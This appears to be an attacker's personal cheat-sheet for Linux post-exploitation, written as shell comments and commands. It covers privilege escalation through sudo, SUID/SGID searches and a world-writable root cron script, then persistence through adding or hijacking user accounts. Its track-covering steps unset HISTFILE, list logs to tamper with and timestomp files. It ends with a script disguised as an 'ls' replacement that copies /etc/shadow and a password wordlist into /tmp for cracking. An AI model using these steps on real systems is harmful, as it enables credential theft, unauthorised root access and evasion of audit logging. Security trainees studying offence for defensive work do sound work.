####################################################################################################################################################################################################

#

#######################################################################################################################################################################################################
path=.:$path        #add dot to path if needed
#Privilege Escalation
    #shit like sudo is a way to escalate privs
    sudo -l                 #See what you can sudo as that user
    
    #SUID/SGID
        #if SUID set is the owner of the file
        #if SGID is set its in the group that has owner perms
        
#Insecure Permissions
    #CRON
        crontab -e            #SGID program that runs under a specific group context so that a user can create/edit their own cron job files
        crontab -l
        crontab -u
        crontab -r
        
        /var/spool/cron/crontab/<user>
        
        /usr/local/bin/cleanup          #world writable and it is being run by the DailyCleanup system cronjob
                                        #command we write/append in /usr/local/bin/cleanup file would be executed as ‘root’
        
        #System Cron files are located in /etc dir
            /etc/crontab
            /etc/cron.d
        
        #another method of creating or editing is with command
            run-parts
    #World Writeable Files and Directions
    #. in path
    
#Vulnerable Software and Services
        #Can do things like .dll injections and such if depending what its vulnerable too


#Persistance
        #Adding or Hijacking a User Account
                #adding you create a new one, hijacking you take and use a preexisting account
                #need to make sure it follows naming standards, etc

#Tradecraft
    #make sure to check for things like rsyslog, or rsyslogd
    unset HISTFILE                      #stops recording the commands run
    #Need to be aware of the init system in use
            #example being SystemD
            Determines what commands to use and logginf structure
    #Commands to see init version
        ls -latr /proc/1/exe
        stat /sbin/init
        man init
        init --version
        ps 1

#Auditing SystemV
    #useful commands to investigate the audit log
    ausearch                    #pulls from the audit log
    ausearch -p 22
    ausearch -m USER_LOGIN -sv no
    ausearch -ua edwards -ts yesterday -te now -i

#Auditing SystemD
    #uses journalctl
    journalctl_TRANSPORT=audit
    journalctl_TRANSPORT=audit | grep 603

#Logs for covering tracks
    auth.log/secure                         #Logins/Authentications
    lastlog                                 #Each Users' last successful login time
    btmp                                    #Bad login attempts
    sulog                                   #usage of SU command
    utmp                                    #Currently logged in users (W command)
    wmtp                                    #Permanent record on user on/off

#Timestomp
    touch -c -t 201603051015 1.txt   #Explicit
    touch -r 3.txt 1.txt             #Reference

#Rsyslog
    /etc/rsyslog.d/*                            #Newer rsyslog refereces for settings/rules
    /etc/rsyslog.conf                           #Older version uses
    grep "IncludeConfig" /etc/rsyslog.conf      #find out

#Order to operate
#Once on Box
sudo -l
find / -type f perm /4000 -ls 2>/dev/null               #find SUID (another possibility to priv escalate)
find / -type f perm /2000 -ls 2>/dev/null               #find SGID 
find / -type f perm /6000 -ls 2>/dev/null               #Find both


#Replacement for ls command to get /etc/shadow and a word list to john the ripper for passwords
        #this script gives working results

#!/bin/bash

sudo cat /etc/shadow > /tmp/no_work.txt
cat /home/billybob/10-million-password-list-top-10000.txt > /tmp/why.txt
cp /home/billybob/10-million-password-list-top-10000.txt /tmp/this.txt


















